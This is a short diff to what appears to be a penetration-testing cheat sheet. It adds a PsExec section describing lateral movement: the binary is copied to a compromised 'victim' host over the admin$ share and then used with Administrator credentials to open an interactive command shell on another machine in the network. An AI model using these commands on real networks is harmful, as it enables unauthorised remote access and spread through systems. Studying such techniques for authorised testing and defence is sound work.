@@ -834,6 +834,17 @@ proxychains nmap -sT -Pn 10.10.0.0/24
 ```
 </details>
 
+</details>
 
+<details>
+<summary>Psexec</summary></br>
+    
+```bash
+# Download the binary file from https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
+# Move the Binary file to victim (that you want move from it to other machine), you can use scp and put it to \\ip\admin$
+# Run pesxec binary in the victim to have cmd in other system in network (you need the an administrator privilage user password  )
+psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
+```
+</details>
 
 
